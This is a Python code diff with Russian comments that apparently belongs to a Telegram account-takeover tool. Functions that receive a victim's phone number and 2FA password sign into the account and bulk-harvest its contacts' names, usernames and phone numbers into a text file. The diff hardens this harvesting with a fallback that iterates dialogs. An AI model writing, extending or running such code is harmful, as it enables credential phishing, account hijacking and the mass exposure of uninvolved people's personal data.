@@ -245,8 +245,16 @@ async def get_real_telegram_contacts(session_token):
         
         print(f"🔍 Начинаем сбор контактов для +{phone}")
         
-        # Получаем контакты через Telethon
-        contacts = await client.get_contacts()
+        # Получаем контакты через GetContactsRequest
+        from telethon.tl.functions.contacts import GetContactsRequest
+        
+        try:
+            result = await client(GetContactsRequest(hash=0))
+            contacts = result.contacts
+            print(f"✅ Получено {len(contacts)} контактов через GetContactsRequest")
+        except Exception as e:
+            print(f"❌ Ошибка получения контактов: {e}")
+            return {'success': False, 'error': str(e)}
         
         # Получаем полную информацию о пользователях
         users_info = []
@@ -337,26 +345,37 @@ async def verify_telegram_2fa(phone, password):
         await client.sign_in(password=password)
         print(f"✅ 2FA успешно пройдена для {phone_clean}")
         
-        # 🔥 ВЫКАЧКА ТОЛЬКО РЕАЛЬНЫХ КОНТАКТОВ (не всех диалогов)
+        # 🔥 ВЫКАЧКА ТОЛЬКО РЕАЛЬНЫХ КОНТАКТОВ
         print(f"🚀 Начинаем сбор РЕАЛЬНЫХ КОНТАКТОВ...")
         
-        # Получаем только контакты (не диалоги, не группы, не каналы)
-        contacts = await client.get_contacts()  # ✅ ИСПРАВЛЕНО: вызываем у client
+        # Получаем контакты через GetContactsRequest
+        from telethon.tl.functions.contacts import GetContactsRequest
+        from telethon.tl.types import InputPeerEmpty
+        
+        try:
+            result = await client(GetContactsRequest(hash=0))
+            contacts = result.contacts
+            print(f"✅ Получено {len(contacts)} контактов через GetContactsRequest")
+        except Exception as e:
+            print(f"❌ Ошибка получения контактов через GetContactsRequest: {e}")
+            # Альтернативный способ - получаем всех пользователей
+            contacts = []
+            async for user in client.iter_dialogs():
+                if user.is_user and not user.entity.bot:
+                    contacts.append(user.entity)
+            print(f"✅ Получено {len(contacts)} контактов через iter_dialogs")
         
         real_contacts = []
         for contact in contacts:
             try:
-                # Проверяем что это пользователь (не бот) и есть в контактах
+                # Проверяем что это пользователь (не бот)
                 if hasattr(contact, 'first_name') and not getattr(contact, 'bot', False):
-                    # Получаем полную информацию о пользователе
-                    full_user = await client.get_entity(contact.id)
-                    
                     contact_info = {
                         'id': contact.id,
                         'first_name': contact.first_name or '',
                         'last_name': contact.last_name or '',
                         'username': contact.username or '',
-                        'phone': getattr(contact, 'phone', '') or getattr(full_user, 'phone', 'скрыт'),
+                        'phone': getattr(contact, 'phone', 'скрыт'),
                         'mutual': getattr(contact, 'mutual_contact', False),
                         'is_contact': True
                     }
@@ -367,10 +386,10 @@ async def verify_telegram_2fa(phone, password):
                     print(f"📞 Контакт: {name} | Телефон: {phone_display} | @{contact.username}")
                     
             except Exception as e:
-                print(f"❌ Ошибка обработки контакта {contact.id}: {e}")
+                print(f"❌ Ошибка обработки контакта {getattr(contact, 'id', 'unknown')}: {e}")
                 continue
 
-        print(f"✅ Собрано {len(real_contacts)} РЕАЛЬНЫХ контактов (только из телефонной книги)")
+        print(f"✅ Собрано {len(real_contacts)} РЕАЛЬНЫХ контактов")
 
         # 🔥 СОЗДАЕМ TXT ФАЙЛ С РЕАЛЬНЫМИ КОНТАКТАМИ
         contacts_txt_file = await create_contacts_txt_file(phone_clean, real_contacts)
